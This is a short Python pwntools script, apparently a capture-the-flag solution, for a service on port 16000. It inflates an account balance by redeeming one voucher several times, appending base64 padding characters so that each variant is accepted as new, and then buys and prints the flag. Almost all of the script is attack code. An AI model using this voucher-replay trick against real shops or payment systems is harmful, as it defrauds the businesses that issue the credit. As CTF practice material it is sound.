#!/usr/bin/env python3
import sys
from pwn import *
import base64

# context.log_level = 'debug'

host = sys.argv[1]
port = 16000

io = None
try:
    io = remote(host, port)
except:
    io = remote(host, port)

io.sendlineafter(b':', b'jeri')

io.recvuntil(b'balance: $')
b = int(io.recvline().strip())
log.info("current money: %d", b)

while b < 420:
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', b'voucher')
    vouch = io.recvline().strip()

    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', vouch)

    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', vouch + b'=')

    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', vouch + b'==')

    io.recvuntil(b'balance: $')
    b = int(io.recvline().strip())
    log.info("current money: %d", b)

io.sendlineafter(b'>', b'2')
io.sendlineafter(b':', b'flag')

flag = io.recvline().strip()
print(flag, flush=True)

io.close()